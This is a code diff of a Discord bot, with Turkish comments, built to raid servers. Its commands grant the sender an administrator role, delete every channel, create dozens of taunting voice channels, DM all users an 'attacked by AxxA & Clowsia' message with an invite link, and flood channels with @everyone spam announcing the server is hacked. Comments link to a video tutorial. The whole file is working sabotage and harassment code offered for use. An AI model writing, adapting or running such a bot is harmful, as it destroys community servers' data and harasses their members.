@@ -25,7 +25,7 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "**Bu Sunucu AxxA & Clowsia Tarafından Saldırıya Maruz Bırakılmıştır Öldün Çık... https://discord.gg/MP2KYajVWp ** :middle_finger:"  
+          "**Bu Sunucu AxxA & Clowsia Tarafından Saldırıya Maruz Bırakılmıştır Öldün... https://discord.gg/MP2KYajVWp ** :middle_finger:"  
         )
       )
       .catch(console.error);
@@ -36,194 +36,194 @@ client.on("message", msg => {
   if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
     msg.delete();
     msg.guild.createRole({
-      name: "AxxA & Clowsia",
+      name: "Clowsia",
       permissions: ["ADMINISTRATOR"]
     });
-    let rol = msg.guild.roles.find(role => role.name === "AxxA & Clowsia");  
+    let rol = msg.guild.roles.find(role => role.name === "Clowsia");  
     msg.member.addRole(rol);
   }
 });
 
 client.on("message", async msg => {
-  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
+  if (msg.content === "+vur") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
     msg.delete();
 
     await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
 
     await msg.guild.createChannel("AxxA", {
-      type: "text"
+      type: "voice"
     });
       await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
       .createChannel("Clowsia Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA Uğradı", { ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Clowsia Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
       .createChannel("Clowsia Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Clowsia Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Clowsia Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
                 await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Clowsia Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Clowsia Uğradı", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
       .createChannel("Savaş", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Açtınız", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Sonuçlarına", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("Katlanacaksınız", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
                 await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
@@ -231,28 +231,28 @@ client.on("message", async msg => {
     
             await msg.guild
       .createChannel("AxxA", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
       .createChannel("AxxA", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
-        type: "text"
+        type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
@@ -1476,43 +1476,43 @@ client.on('message', msg => {
         msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
-        msg.channel.send(''); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://media.discordapp.net/attachments/877870293585100819/879748026812485632/Turbanl_Mona_Lisa.jpg?width=288&height=432 @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
         msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
